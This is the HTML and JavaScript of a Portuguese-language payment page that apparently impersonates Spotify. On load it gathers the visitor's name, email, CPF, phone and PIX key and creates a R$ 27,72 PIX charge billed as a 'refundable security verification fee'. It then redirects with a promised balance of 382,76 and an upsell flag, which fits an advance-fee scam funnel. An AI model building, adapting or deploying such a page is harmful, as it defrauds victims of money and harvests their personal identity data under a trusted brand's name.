<html lang="pt-BR">
<head>

  <!-- FONT GOOGLE POPPINS -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #121212 0%, #181818 50%, #0f1c14 100%);
      min-height: 100vh;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      overflow-x: hidden;
    }

    .container {
      max-width: 420px;
      width: 100%;
      text-align: center;
    }

    .logo {
      width: 85px;
      height: auto;
      margin-bottom: 25px;
      display: inline-block;
    }

    .card {
      background: rgba(255, 255, 255, 0.04);
      border-radius: 16px;
      padding: 35px 25px;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }

    .loading-icon {
      width: 55px;
      height: 55px;
      border: 3.5px solid rgba(29, 185, 84, 0.2);
      border-top-color: #1DB954;
      border-radius: 50%;
      margin: 0 auto 20px;
      animation: spin 0.9s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    h1 {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #ffffff;
    }

    .subtitle {
      color: #b3b3b3;
      font-size: 13.5px;
      margin-bottom: 20px;
    }

    .valor-box {
      background: rgba(29, 185, 84, 0.12);
      border: 1px solid #1DB954;
      border-radius: 12px;
      padding: 14px;
      margin-bottom: 22px;
    }

    .valor-total {
      font-size: 26px;
      font-weight: 700;
      color: #1DB954;
    }

    .steps {
      text-align: left;
      margin: 20px 0;
    }

    .step {
      display: flex;
      align-items: center;
      padding: 10px 0;
      opacity: 0.45;
      transition: all 0.3s ease;
    }

    .step.active {
      opacity: 1;
    }

    .step.completed {
      opacity: 1;
    }

    .step-icon {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
      font-size: 12px;
      font-weight: 600;
      color: #ffffff;
      flex-shrink: 0;
    }

    .step.active .step-icon {
      background: rgba(29, 185, 84, 0.25);
      color: #1DB954;
      animation: pulse 1.4s infinite;
    }

    .step.completed .step-icon {
      background: #1DB954;
      color: #000;
      font-weight: 700;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.15); }
    }

    .step-text {
      font-size: 14px;
      color: #b3b3b3;
      font-weight: 500;
    }

    .step.active .step-text,
    .step.completed .step-text {
      color: #ffffff;
    }

    .error-message {
      background: rgba(255, 70, 70, 0.12);
      border: 1px solid #ff4646;
      border-radius: 10px;
      padding: 15px;
      color: #ff6666;
      font-size: 13.5px;
      margin-top: 20px;
      display: none;
      line-height: 1.5;
    }

    .error-message.show {
      display: block;
    }

    .btn-retry {
      display: inline-block;
      margin-top: 12px;
      padding: 10px 20px;
      background: #1DB954;
      border: none;
      border-radius: 8px;
      color: #000;
      font-size: 13.5px;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
    }

    .btn-retry:hover {
      background: #1ed760;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="/images/logowhite.png" class="logo" alt="Spotify" onerror="this.onerror=null; this.src='/checkout/images/logowhite.png';">
    
    <div class="card">
      <div class="loading-icon" id="loadingIcon"></div>
      
      <h1 id="title">Processando Pagamento</h1>
      <p class="subtitle" id="subtitle">Aguarde enquanto geramos seu PIX</p>
      
      <div class="valor-box">
        <div class="valor-total">R$ 27,72</div>
      </div>
      
      <div class="steps" id="steps">
        <div class="step active" id="step1">
          <div class="step-icon" id="icon1">1</div>
          <span class="step-text">Recuperando dados</span>
        </div>
        <div class="step" id="step2">
          <div class="step-icon" id="icon2">2</div>
          <span class="step-text">Gerando código PIX</span>
        </div>
        <div class="step" id="step3">
          <div class="step-icon" id="icon3">3</div>
          <span class="step-text">Preparando QR Code</span>
        </div>
      </div>
      
      <div class="error-message" id="errorMessage"></div>
    </div>
  </div>

  <!-- UTMIFY -->
  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-xcod-sck
    data-utmify-prevent-subids
    async
    defer>
  </script>

  <!-- SCRIPT DE PROCESSAMENTO 100% EMBUTIDO (SEM DEPENDÊNCIAS EXTERNAS) -->
  <script>
    function delay(ms) {
      return new Promise(function(resolve) { setTimeout(resolve, ms); });
    }

    function activateStep(num) {
      for (var i = 1; i <= 3; i++) {
        var el = document.getElementById('step' + i);
        if (!el) continue;
        if (i === num) {
          el.classList.add('active');
          el.classList.remove('completed');
        }
      }
    }

    function completeStep(num) {
      var el = document.getElementById('step' + num);
      var icon = document.getElementById('icon' + num);
      if (el) {
        el.classList.remove('active');
        el.classList.add('completed');
      }
      if (icon) {
        icon.innerHTML = '✓';
      }
    }

    function mostrarErro(msg) {
      var el = document.getElementById('errorMessage');
      if (el) {
        el.innerHTML = msg + '<br><button class="btn-retry" onclick="location.reload()">Tentar Novamente</button>';
        el.classList.add('show');
      }
      var icon = document.getElementById('loadingIcon');
      if (icon) icon.style.display = 'none';
      var subtitle = document.getElementById('subtitle');
      if (subtitle) subtitle.innerText = 'Não foi possível gerar seu PIX';
    }

    function recuperarDados() {
      var params = new URLSearchParams(window.location.search);
      var dados = {};

      dados.nome = params.get('nome') || localStorage.getItem('usuario_nome') || localStorage.getItem('pix_nome') || 'Cliente Spotify';
      dados.email = params.get('email') || localStorage.getItem('usuario_email') || 'cliente@email.com';
      dados.telefone = params.get('telefone') || localStorage.getItem('pix_chave') || localStorage.getItem('usuario_telefone') || '11999998888';
      dados.cpf = params.get('cpf') || localStorage.getItem('usuario_cpf') || '';
      dados.pix = params.get('pix') || localStorage.getItem('pix_chave') || '';

      ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(function(p) {
        var v = params.get(p) || localStorage.getItem(p);
        if (v) dados[p] = v;
      });

      return dados;
    }

    async function criarTransacao(dados) {
      var payload = {
        nome: dados.nome,
        email: dados.email,
        cpf: dados.cpf,
        telefone: dados.telefone,
        amount: 2772, // R$ 27,72
        produto: 'Verificação de Segurança (Taxa Reembolsável)',
        src: dados.src || dados.utm_source || '',
        sck: dados.sck || '',
        utm_source: dados.utm_source || '',
        utm_medium: dados.utm_medium || '',
        utm_campaign: dados.utm_campaign || '',
        utm_term: dados.utm_term || '',
        utm_content: dados.utm_content || ''
      };

      console.log('Enviando payload upsell para /api/create-payment:', payload);

      var resp = await fetch('/api/create-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      var rawText = await resp.text();
      var json;
      try {
        json = JSON.parse(rawText);
      } catch (e) {
        console.error('Resposta não-JSON:', rawText);
        return { success: false, error: 'Erro de comunicação (' + resp.status + ')' };
      }
      return json;
    }

    function salvarDadosTransacao(transacao, dados) {
      var id = transacao.id || transacao.txid || '';
      var qrCode = transacao.qr_code || transacao.qrCode || transacao.pix_code || '';

      localStorage.setItem('pix_txid_up1', id);
      if (qrCode) localStorage.setItem('pix_code_up1', qrCode);
      localStorage.setItem('pix_valor_up1', '27,72');
      localStorage.setItem('pix_txid', id);
      if (qrCode) localStorage.setItem('pix_code', qrCode);
      localStorage.setItem('pix_valor', '27,72');
    }

    function redirecionarParaPix(transacao, dados) {
      var params = new URLSearchParams();
      var id = transacao.id || transacao.txid || '';
      var qrCode = transacao.qr_code || transacao.qrCode || transacao.pix_code || '';

      if (id) params.append('id', id);
      if (qrCode) params.append('code', qrCode);
      if (qrCode) params.append('qr_code', qrCode);
      params.append('valor', '27,72');
      params.append('amount', '2772');
      params.append('tipo', 'up1');
      params.append('upsell', '1');
      params.append('saldo', '382,76');

      if (dados.nome) params.append('nome', dados.nome);
      if (dados.email) params.append('email', dados.email);
      if (dados.pix) params.append('pix', dados.pix);
      if (dados.cpf) params.append('cpf', dados.cpf);
      if (dados.telefone) params.append('telefone', dados.telefone);

      ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(function(p) {
        if (dados[p]) params.append(p, dados[p]);
      });

      var redirectUrl = '/checkout/pix.html?' + params.toString();
      console.log('Redirecionando para:', redirectUrl);
      window.location.href = redirectUrl;
    }

    // Fluxo principal de execução
    async function iniciarCheckout() {
      try {
        activateStep(1);
        var dados = recuperarDados();
        await delay(500);
        completeStep(1);

        activateStep(2);
        var res = await criarTransacao(dados);
        
        if (!res || !res.success || !res.data) {
          console.error('Falha na criação do Pix:', res);
          mostrarErro(res && res.error ? res.error : 'Erro ao gerar PIX com o gateway de pagamento.');
          return;
        }

        completeStep(2);

        activateStep(3);
        salvarDadosTransacao(res.data, dados);
        await delay(400);
        completeStep(3);

        await delay(300);
        redirecionarParaPix(res.data, dados);
      } catch (err) {
        console.error('Erro no fluxo de checkout:', err);
        mostrarErro('Erro de conexão ao processar o saque. Tente novamente.');
      }
    }

    // Inicia imediatamente ao carregar
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', iniciarCheckout);
    } else {
      iniciarCheckout();
    }
  </script>
</body>
</html>
